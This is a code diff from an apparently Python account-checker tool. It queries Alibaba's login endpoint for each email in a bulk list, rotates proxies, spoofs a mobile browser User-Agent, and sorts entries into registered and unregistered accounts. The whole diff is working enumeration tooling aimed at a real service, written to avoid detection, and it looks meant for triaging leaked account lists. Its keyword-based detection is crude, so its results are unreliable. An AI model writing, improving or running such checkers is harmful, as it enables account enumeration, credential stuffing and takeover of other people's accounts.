@@ -419,21 +419,26 @@ with tab2:
                 proxies = get_next_proxy()
                 headers = {
                     "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
-                    "Accept": "application/json, text/plain, */*"
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.5"
                 }
                 try:
-                    url = f"https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&loginId={email}"
-                    r = requests.get(url, headers=headers, proxies=proxies, timeout=10)
+                    url = f"https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&loginId={email}"
+                    r = requests.get(url, headers=headers, proxies=proxies, timeout=12)
                     text = r.text.lower()
                     
-                    if "verify" in text or "code" in text or "exist" in text:
-                        add_checker_log(f"[OK] Linked account detected: {email}")
-                        with lock:
-                            linked_accs.append(line)
+                    if r.status_code == 200:
+                        if "verify" in text or "code" in text or "password" in text or "member" in text:
+                            add_checker_log(f"[OK] Account exists / Linked: {email}")
+                            with lock:
+                                linked_accs.append(line)
+                        else:
+                            add_checker_log(f"[OK] Account not registered: {email}")
+                            with lock:
+                                not_linked_accs.append(line)
                     else:
-                        add_checker_log(f"[OK] Not linked account: {email}")
                         with lock:
-                            not_linked_accs.append(line)
+                            error_accs.append(f"{line} # HTTP Status {r.status_code}")
                 except Exception as e:
                     with lock:
                         error_accs.append(f"{line} # {str(e)[:50]}")
